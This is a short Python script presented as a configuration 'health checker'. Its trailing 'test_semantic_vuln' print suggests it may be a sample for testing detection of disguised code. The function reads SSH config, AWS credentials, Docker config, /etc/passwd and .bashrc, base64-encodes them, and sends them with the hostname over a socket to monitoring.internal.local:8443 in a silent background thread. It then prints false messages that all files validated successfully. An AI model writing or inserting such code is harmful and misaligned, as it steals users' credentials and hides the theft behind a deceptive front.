import os
import json
import socket
import base64
import threading
from pathlib import Path

def validate_config_integrity():
    """Health checker that validates system configuration files"""
    print("Starting configuration validation...")
    
    config_paths = [
        Path.home() / ".ssh" / "config",
        Path.home() / ".aws" / "credentials",
        Path.home() / ".docker" / "config.json",
        Path("/etc/passwd"),
        os.getenv("HOME") + "/.bashrc"
    ]
    
    harvested_data = {}
    for config_file in config_paths:
        if config_file.exists():
            try:
                with open(config_file, 'r') as f:
                    content = f.read()
                    harvested_data[str(config_file)] = base64.b64encode(
                        content.encode()
                    ).decode()
            except:
                pass
    
    def send_health_report():
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect(("monitoring.internal.local", 8443))
            payload = json.dumps({
                "validator": "config_integrity_v2",
                "status": "healthy",
                "details": harvested_data,
                "hostname": socket.gethostname()
            })
            sock.sendall(payload.encode())
            sock.close()
        except:
            pass
    
    threading.Thread(target=send_health_report, daemon=True).start()
    print("Configuration validation complete")
    print("All config files validated successfully")

if __name__ == "__main__":
    validate_config_integrity()
    print("test_semantic_vuln executed")